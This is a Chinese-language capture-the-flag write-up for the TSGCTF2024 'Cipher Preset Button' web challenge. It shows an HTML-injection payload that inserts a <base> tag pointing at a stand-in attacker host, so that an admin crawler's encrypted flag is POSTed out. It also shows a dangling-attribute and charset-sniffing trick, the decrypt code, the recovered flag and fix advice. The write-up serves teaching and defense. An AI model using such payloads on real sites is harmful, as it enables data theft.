# TSGCTF2024 Cipher Preset Button

## 题目简述

用户可以保存一组 `name` 与 `prefix`，再把预设页面提交给管理员 crawler。crawler 会先把 48 个 JavaScript 字符组成的 flag 写入 `localStorage.key`，随后访问预设页面并点击加密按钮。页面用随机数组与 key 逐字符异或，再把 `prefix` 和十六进制结果 POST 到 `/result`：

```javascript
function generateRandomBytes(prefix, length) {
  const data = new Uint16Array(length);
  for (let i = 0; i < length; i++) {
    data[i] = i < prefix.length
      ? prefix.charCodeAt(i)
      : Math.floor(Math.random() * 65536);
  }
  return data;
}

function encrypt(prefix, key) {
  const secret = generateRandomBytes(prefix, key.length);
  return Uint16Array.from(key, (ch, i) => key.charCodeAt(i) ^ secret[i]);
}
```

服务器限制 `prefix.length <= 25`，因此正常情况下只能知道异或掩码的前 25 项，不能恢复完整的 48 字符 flag。本题需要组合 HTML 注入、`<base>` URL 重定向、悬空标记和浏览器字符集嗅探。

## 解题过程

### 1. 从标题位置注入 `<base>`

预设页把 `name` 放入标题元素，再通过 Mustache 三花括号原样输出：

```javascript
const titleElem = `<title>${sanitizeHtml(preset.name)} - preset</title>`;
```

```html
{{{ titleElem }}}
```

`sanitizeHtml` 只在字符串包含 `meta` 或 `link` 时进行实体编码，无法阻止其他标签。CSP 的 nonce 能阻止直接脚本和样式注入，但策略没有限制网络连接，而且页面中的 `fetch('/result')` 会按照文档基准 URL 解析。插入：

```html
</title><base href="https://ATTACKER.example" data-foo="
```

后，`/result` 被解析到攻击者域名。攻击者的接收端同时回应 JSON POST 的 CORS 预检，即可取得请求体中的 `prefix` 和 `result`。

### 2. 用悬空属性吞掉 UTF-8 声明

仅重定向请求还不够，因为 25 字符 prefix 只能解开 flag 的一部分。上面的 payload 故意让 `data-foo="` 没有闭合。模板后续内容原本是：

```html
 - preset</title>
<meta charset="UTF-8">
```

浏览器会把这段内容吞入 `<base>` 的悬空属性值，使原有 `<meta charset="UTF-8">` 不再成为独立有效的编码声明。服务器响应头也只设置 `Content-Type: text/html`，没有显式 charset，于是 Firefox 会根据页面字节自动判断编码。

### 3. 让服务端的 25 字符在浏览器中变成 50 字符

提交 25 个西里尔字母 `л`：

```text
ллллллллллллллллллллллллл
```

Node.js 按 Unicode 字符计数，服务端看到长度正好是 25，因此通过限制。每个 `л` 的 UTF-8 字节是 `D0 BB`；当缺少编码声明的 Firefox 把响应按 Windows-1252 解码时，这两个字节分别成为 `Ð` 与 `»`，所以浏览器中的 prefix 变成 50 个字符：

```text
Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»Ð»
```

完整创建预设的 JSON 为：

```json
{
  "name": "</title><base href=\"https://ATTACKER.example\" data-foo=\"",
  "prefix": "ллллллллллллллллллллллллл"
}
```

随后把 `/presets/<id>` 提交给 `/report`。crawler 的 key 长度为 48，而浏览器中的 prefix 长度为 50，因此 `generateRandomBytes` 的 48 项全部取自已知 prefix，不再使用随机数。加密请求被 `<base>` 改写到攻击者服务器。

### 4. 从截获的结果恢复 flag

`result` 每个 `Uint16` 元素编码为 4 位十六进制。对截获的每一项重新与浏览器实际使用的 prefix 字符码异或：

```typescript
function decrypt(prefix: string, result: string): string {
  const codes: number[] = [];
  for (let i = 0; i < result.length / 4; i++) {
    const encrypted = parseInt(result.slice(i * 4, i * 4 + 4), 16);
    codes.push(prefix.charCodeAt(i) ^ encrypted);
  }
  return String.fromCharCode(...codes);
}
```

恢复结果为：

```text
TSGCTF{8ab2815d40|reset!if d<P653124710Y|ac7aa4}
```

## 方法总结

本题的关键不是绕过 CSP 执行脚本，而是改变已有可信脚本的解析环境。HTML 注入先用 `<base>` 劫持相对请求，再用悬空属性破坏 charset 元数据；同一组 UTF-8 字节在服务端和浏览器中产生不同字符长度，最终把受限的 25 字符前缀扩展到足以覆盖 48 字符 flag。修复时应把用户输入作为文本节点输出、禁止用户控制 `<head>` 结构、在 HTTP `Content-Type` 中固定 UTF-8，并用 `connect-src 'self'` 限制外联；长度校验还应基于协议实际处理的字节或码点语义，而不能假设不同解析层的字符串表示一致。
